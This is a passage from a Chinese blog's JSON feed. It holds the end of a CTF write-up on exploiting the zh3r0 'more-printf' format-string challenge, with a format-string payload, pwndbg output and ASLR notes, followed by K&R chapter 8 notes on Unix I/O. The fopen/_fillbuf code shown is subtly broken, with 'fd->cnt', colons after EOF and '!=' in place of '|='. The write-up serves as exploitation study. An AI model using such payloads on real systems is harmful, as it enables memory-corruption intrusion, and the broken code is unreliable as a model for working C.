class=\"number\">186334</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>​\t<font color=\"red\">作者认为修改的read+17这个值是修改完后才会执行到的…依据是什么呢,如果不是这样的呢?</font></p>\n<p>​\t下断点: b *read 下不了…q</p>\n<p>​\t要输入payload: %c%c%c%5c%hhn%*8$d%186326c%5$n\t也不行</p>\n<p>​\t</p>\n<p>​\t可以下watch断点的, watch一下要修改的地方的地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; info b</span><br><span class=\"line\">Num     Type           Disp Enb Address            What</span><br><span class=\"line\"><span class=\"number\">7</span>       breakpoint     keep y   <span class=\"number\">0x00007ffff7a46f3f</span> in __fprintf at <span class=\"built_in\">fprintf</span>.c:<span class=\"number\">32</span></span><br><span class=\"line\">\tbreakpoint already hit <span class=\"number\">1</span> time</span><br><span class=\"line\"><span class=\"number\">9</span>       breakpoint     keep n   <span class=\"number\">0x00007ffff7af2140</span> in __GI___libc_read at ../sysdeps/unix/sysv/linux/read.c:<span class=\"number\">27</span></span><br><span class=\"line\"><span class=\"number\">11</span>      breakpoint     keep y   <span class=\"number\">0x00007ffff7af2140</span> in __GI___libc_read at ../sysdeps/unix/sysv/linux/read.c:<span class=\"number\">27</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>下的断点没用呢… 换个patchelf试试,</p>\n<p>2.27-3ubuntu1.4</p>\n<p><a href=\"https://surager.pub/_posts/2021-05-11-x86%E6%9E%B6%E6%9E%84%E4%B8%8Bpwn%E9%A2%98%E7%9B%AElibc%E6%A6%82%E8%BF%B0/\">https://surager.pub/_posts/2021-05-11-x86架构下pwn题目libc概述/</a></p>\n<p>先用这个吧 2.27-3ubuntu1.5_amd64</p>\n<p>进去一会后按c, 就能够进入最后的调试了,不行就下一个,继续c</p>\n<p>关键再c就退出去了..</p>\n<p>注意下断点的地址, exit可以 那是不是可以下system\\execve</p>\n<p>直接q然后继续就好了</p>\n<p>gdb –pid 进去</p>\n<h3 id=\"为什么这里就可以只枚举32呢\"><a href=\"#为什么这里就可以只枚举32呢\" class=\"headerlink\" title=\"为什么这里就可以只枚举32呢?\"></a>为什么这里就可以只枚举32呢?</h3><p>​\t所以对抗alsr的点不是在onegadget这个地址上,这里是确定的, 那什么是不确定的呢?</p>\n<p>​\t就是要修改的地址的地址, 它不一定是0x08,可能是0x18 28 也可能是0x00 0x20, 所以才会有32种可能</p>\n<p>​\t不过在我的电脑上, 第2的字节的一半也变了…那随机化的范围又大了(关闭随机化的情况下,开启了好像又一样了)</p>\n<p>​\t</p>\n<h3 id=\"实际修改的指针\"><a href=\"#实际修改的指针\" class=\"headerlink\" title=\"实际修改的指针\"></a>实际修改的指针</h3><p>​\t</p>\n<p>​\t<font color=\"red\">改的其实是上面的函数的地址(实测)  作者提出的修改read+17行不通</font></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111153904670.png\" alt=\"image-20231111153904670\"></p>\n<h3 id=\"调试下断点和bt回溯遇到了问题\"><a href=\"#调试下断点和bt回溯遇到了问题\" class=\"headerlink\" title=\"调试下断点和bt回溯遇到了问题\"></a>调试下断点和bt回溯遇到了问题</h3><p>​\t首先,bt回溯时候的各种问题,我认为是因为劫持控制流破坏了识别算法, 识别不出来,</p>\n<p>syscall能下断点吗</p>\n<p>do_system</p>\n<p>gdb 执行了新的sh,怎么跟踪呢? 如何看上一个进程的bt</p>\n<p>为什么会执行到上面那里呢?</p>\n<p>为什么会从那里取值rip呢?</p>\n<p>这里貌似是比较重要的函数</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111151211775.png\" alt=\"image-20231111151211775\"></p>\n<p>这里面进行解析的吧, 是的,所以重点应该在这里</p>\n<p>printf_positional</p>\n<p>怎么样才能跟踪执行流呢</p>\n<p>故意输错 让他卡在那是不是就可以了</p>\n<p>注意看这里, 返回了最开始的栈帧,</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111153131246.png\" alt=\"image-20231111153131246\"></p>\n<h3 id=\"为什么只链接了那两个就可以了\"><a href=\"#为什么只链接了那两个就可以了\" class=\"headerlink\" title=\"为什么只链接了那两个就可以了??????\"></a>为什么只链接了那两个就可以了??????</h3><h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>  buffer &#x3D; (char *)malloc(0x20 + 1); &#x2F;&#x2F;为啥要+1? 感觉好像不加也一样</p>\n<p>​\tset $rdi&#x3D;_IO_stdout  ( 其他版本呢?)</p>\n<p>set *0x7ffc28b196d8&#x3D; 0x7f8d3729b2a5 (为啥一次设置不全呢?)</p>\n<p>以及,是否可以修改两次4字节呢… 方法有点多,但会越来越复杂…先暂时放一下</p>\n<p>​\t如何下断点来到这里呢? 最后返回onegadget的时候下不了断点</p>\n<p>gdb启动的时候如何多下几个断点</p>\n<p>为什么会从从rsp上面取值? </p>\n<h3 id=\"tips\"><a href=\"#tips\" class=\"headerlink\" title=\"tips\"></a>tips</h3><p>gdb中如何关了alsr调试呢</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set disable-randomization on 关闭</span><br><span class=\"line\">set disable-randomization off 开启</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.anquanke.com/post/id/85785\">https://www.anquanke.com/post/id/85785</a></p>\n<p><a href=\"https://xz.aliyun.com/t/12304\">https://xz.aliyun.com/t/12304</a></p>\n<p><a href=\"https://www.hakuya.work/post/2\">https://www.hakuya.work/post/2</a></p>\n<p><a href=\"https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/\">https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/</a></p>\n<p><a href=\"https://github.com/zh3r0/zh3r0-ctf/tree/main/V2/pwn/more-printf/public/vuln\">https://github.com/zh3r0/zh3r0-ctf/tree/main/V2/pwn/more-printf/public/vuln</a></p>\n<p><a href=\"https://blog.caprinux.com/2021/06/07/zh3ro-ctf-more-printf/\">https://blog.caprinux.com/2021/06/07/zh3ro-ctf-more-printf/</a></p>\n<p><a href=\"https://sangjun.xyz/125\">https://sangjun.xyz/125</a></p>\n<p>感觉前面几个讲的方法最后一步都有问题</p>\n<p><a href=\"https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/\">https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/</a></p>\n<p>这一篇或许是对的</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/",
            "url": "https://tangzichengcc.github.io/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/",
            "title": "c语言回炉重造-unix系统接口",
            "date_published": "2023-11-12T07:29:52.000Z",
            "content_html": "<h2 id=\"8-2-低级IO-read-x2F-write\"><a href=\"#8-2-低级IO-read-x2F-write\" class=\"headerlink\" title=\"8.2 低级IO read&#x2F;write\"></a>8.2 低级IO read&#x2F;write</h2><p>​\t利用这个系统调用来构造高级一点的函数, 库函数之类的</p>\n<p>​\t系统调用的函数原型集中放在一个头文件syscalls.h中( 事实上目前的系统里只有syscall.h,最后也会调用unistd.h)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//将输入复制到输出</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//#include &quot;syscalls.h&quot;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[BUFSIZ];</span><br><span class=\"line\">    <span class=\"type\">int</span> n;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span>((n = read(<span class=\"number\">0</span>, buf, BUFSIZ)) &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">        write(<span class=\"number\">1</span>, buf,n);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">io.c:<span class=\"number\">3</span>:<span class=\"number\">10</span>: fatal error: syscalls.h: No such file or directory</span><br><span class=\"line\">    <span class=\"number\">3</span> | <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;syscalls.h&quot;</span></span></span><br><span class=\"line\">      |          ^~~~~~~~~~~~</span><br><span class=\"line\">compilation terminated.</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://blog.csdn.net/sesiria/article/details/52337114\">https://blog.csdn.net/sesiria/article/details/52337114</a></p>\n<p>​\tPS: &#x2F;usr&#x2F;include&#x2F;目录下存着c的各种头文件,可以从这里寻找</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">cat</span> /usr/include/syscall.h</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">include &lt;sys/syscall.h&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t确实是存在这个目录的,但是为什么没找到呢? <font color=\"red\"> syscall.h, 没有s</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;syscall.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span> <span class=\"comment\">//stdio.h里面有BUFSIZ, 或者自己定义一下</span></span></span><br></pre></td></tr></table></figure>\n\n<p>​\t</p>\n<p>​\t实现getchar(无缓冲区)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;syscalls.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getchar</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> c;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (read(<span class=\"number\">0</span>,&amp;c,<span class=\"number\">1</span>) == <span class=\"number\">1</span>) ? (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>) c: EOF;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t</p>\n<p>​\t第二版 一次读入一组字符,但每次只输出一个字符(简单的带<strong>缓冲区</strong>的版本)</p>\n<p>​\t但是这个函数调用完了,缓冲区什么的也都没了吧?? 不是的, static的生命周期,在整个程序的运行期间都存在</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//#include &quot;syscalls.h&quot;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getchar</span><span class=\"params\">(<span class=\"type\">void</span>)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> s;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((s = getchar())!=EOF)&#123;</span><br><span class=\"line\">    \twrite(<span class=\"number\">1</span>,&amp;s,<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getchar</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">static</span> <span class=\"type\">char</span> buf[BUFSIZ];</span><br><span class=\"line\">    <span class=\"type\">static</span> <span class=\"type\">char</span> *bufp = buf;</span><br><span class=\"line\">    <span class=\"type\">static</span> <span class=\"type\">int</span> n = <span class=\"number\">0</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n == <span class=\"number\">0</span>)&#123;<span class=\"comment\">//缓冲区为空</span></span><br><span class=\"line\">        n = read(<span class=\"number\">0</span>,buf, <span class=\"keyword\">sizeof</span> buf);</span><br><span class=\"line\">        bufp = buf;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (--n&gt;<span class=\"number\">0</span>) ? (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>) *bufp++ : EOF;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"8-3-open、creat、close和unlink\"><a href=\"#8-3-open、creat、close和unlink\" class=\"headerlink\" title=\"8.3 open、creat、close和unlink\"></a>8.3 open、creat、close和unlink</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> fd;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">open</span><span class=\"params\">(<span class=\"type\">char</span> *name,<span class=\"type\">int</span> flags,<span class=\"type\">int</span> perms)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">fd = open(name, flags, perms)</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdarg.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PERMS 0666</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">error</span><span class=\"params\">(<span class=\"type\">char</span> *,...)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> f1,f2,n;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[BUFSIZ];</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc != <span class=\"number\">3</span>)</span><br><span class=\"line\">        error(<span class=\"string\">&quot;Usage: cp from to&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((f1 = open(argv[<span class=\"number\">1</span>],O_RDONLY,<span class=\"number\">0</span>)) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">        error(<span class=\"string\">&quot;cp: can&#x27;t open %s&quot;</span>,argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((f2 = creat(argv[<span class=\"number\">2</span>],PERMS)) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">        error(<span class=\"string\">&quot;cp: can&#x27;t create %s,mode %03o&quot;</span>,argv[<span class=\"number\">2</span>],PERMS);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((n = read(f1,buf,BUFSIZ)) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(write(f2,buf,n) !=n)</span><br><span class=\"line\">            error(<span class=\"string\">&quot;cp: write error on file %s&quot;</span>,argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">error</span><span class=\"params\">(<span class=\"type\">char</span> *fmt,...)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    va_list args;</span><br><span class=\"line\">    </span><br><span class=\"line\">    va_start(args,fmt);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,<span class=\"string\">&quot;error: &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">vfprintf</span>(<span class=\"built_in\">stderr</span>,fmt,args);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    va_end(args);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"8-5-fopen与getc函数的实现\"><a href=\"#8-5-fopen与getc函数的实现\" class=\"headerlink\" title=\"8.5 fopen与getc函数的实现\"></a>8.5 fopen与getc函数的实现</h2><p>给的iobuf应该是dos的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;syscalls.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PERMS 0666</span></span><br><span class=\"line\"></span><br><span class=\"line\">FILE *<span class=\"title function_\">fopen</span><span class=\"params\">(<span class=\"type\">char</span> *name, <span class=\"type\">char</span> *mode)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> fd;</span><br><span class=\"line\">    FILE *fp;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (*mode != <span class=\"string\">&#x27;r&#x27;</span> &amp;&amp; *mode !=<span class=\"string\">&#x27;w&#x27;</span> &amp;&amp; *mode!=<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> (fp= _iob; fp &lt; _iob + OPEN_MAX; fp++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((fp-&gt;flag &amp; (_READ | _WRITE)) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fp &gt; _iob+OPEN_MAX)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (*mode == <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">        fd = creat(name,PERMS);</span><br><span class=\"line\">   \t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (*mode == <span class=\"string\">&#x27;a&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((fd = open(name,O_WRONLY,<span class=\"number\">0</span>)) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">            fd = creat(name,PERMS);</span><br><span class=\"line\">        lseek(fd,<span class=\"number\">0L</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span></span><br><span class=\"line\">        fd = open(name,O_RDONLY,<span class=\"number\">0</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fd == <span class=\"number\">-1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    fp-&gt;fd = fd;</span><br><span class=\"line\">    fd-&gt;cnt =<span class=\"number\">0</span>;</span><br><span class=\"line\">    fp-&gt;base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    fp-&gt;flag = (*mode == <span class=\"string\">&#x27;r&#x27;</span>) ? _READ : _WRITE;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _fillbuf(FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> bufsize;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((fp-&gt;flag&amp;(_READ|_EOF|_ERR)) != _READ)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> EOF:</span><br><span class=\"line\">    bufsize = (fp-&gt;flag &amp; _UNBUF) ? <span class=\"number\">1</span> : BUFSIZE;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fp-&gt;base == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((fp-&gt;base = (<span class=\"type\">char</span> *) <span class=\"built_in\">malloc</span>(bufsize)) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    fp-&gt;ptr = fp-&gt;base;</span><br><span class=\"line\">    fp-&gt;cnt = read(fp-&gt;fd, fp-&gt;ptr,bufsize);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (--fp-&gt;cnt &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (fp-&gt;cnt == <span class=\"number\">-1</span>)</span><br><span class=\"line\">            fp-&gt;flag |= _EOF;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            fp-&gt;flag !=_ERR:</span><br><span class=\"line\">        fp-&gt;cnt = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> EOF:</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>) *fp-&gt;ptr++;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"8-6\"><a href=\"#8-6\" class=\"headerlink\" title=\"8.6\"></a>8.6</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span 